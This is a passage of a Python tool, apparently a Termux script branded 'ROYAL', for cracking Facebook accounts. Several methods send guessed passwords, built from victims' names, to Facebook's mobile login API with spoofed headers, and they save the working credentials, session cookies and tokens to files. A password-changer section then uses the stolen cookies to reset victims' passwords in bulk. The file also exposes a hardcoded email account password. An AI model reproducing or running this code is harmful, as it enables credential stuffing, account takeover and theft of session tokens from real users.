'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[ROYAL-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/ROYAL_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ROYAL_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ROYAL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ROYAL_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [FaiSy] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod2Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(30000, 40000)),
'X-FB-SIM-HNI': str(random.randint(30000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid={nid};pid=Main;tid={tid};nc=1;fc=0;bc=0;cid={connection_token()}',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ROYAL_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ROYAL] %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "it_IT",
"client_country_code": "Us",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '6060',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ROYAL] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"device":"Samsung",
"sdk":"Android",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': R_Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[ROYAL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ROYAL_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ROYAL_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ROYAL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ROYAL_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.r_crack(uid,pwx)
		except Exception as e:
			print(e)
class Join:
	def __init_(self):
		logo()
		#s.system("xdg-open https://wa.me/+923152056613")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/HF3burNYuZx0den94ooYbk')
		iAmMain().iAmMenu()
	def Facebook(self):
		os.system('xdg-open https://facebook.com/groups/124939013896146/')
		iAmMain().iAmMenu()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("	[✓]	Example  /sdcard/file1.txt  ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("	Example  :-  /sdcard/file1.txt  ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	  Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [	Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):

		try:
			p("	Example  :-  /sdcard/file.txt	")
			line()
			file = input(" [✓] File Path :- ")
			line()
			p("	Example  :-  /sdcard/file1.txt	")
			ofile= input(" [✓] File Save Path :- ")
			line()
			try:
				p("	 Example :-  1 ,2,3,4,5 etc	")
				limit = int(input(" [=] How many Links with names you wanna grab :- "))
			except:
				limit = 2
			p("	Example  :-	100089 , 100088 etx  ")
			for n in range(limit):
				line()
				digit = int(input(" [•|•] Put Digits %s :- "%(n+1)))
				os.system('cat '+file+' | grep '+str(digit)+' >>'+ofile+' ')
				p(" [	Your File Saved in :- %s ]  "%(ofile))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.with_names()
		except:
			p("	[X] File Not Found ;(  ");sp(1);self.with_names()


class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : ROYAL")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/dilute_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "ROYAL@@@"
		logo()
		p(" [•] Password Changer By : ROYAL")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			
			try:
				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
			except CE:
				p(" [•] Check Your Internet")
			except Exception as e:
				print(e)
			if "/zero/optin/write/?" in r:
				self.iAmFreeMode(cookies,r)
			try:
				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "ROYAL"
		logo()
		p(" [•] Password Changer By : ROYAL ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		try:
			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
		except CE:
			p(" [•] Check Your Internet")
		except Exception as e:
			print(e)
		if "/zero/optin/write/?" in r:
			self.iAmFreeMode(cookies,r)
		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
		
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "ROYAL786"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New Default Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be Six Characters More .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")

		self.iAmPasswordManager()







if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
	#iAmMain().method4('100089112641726','vishnu singh',['Muhammad Siyal'])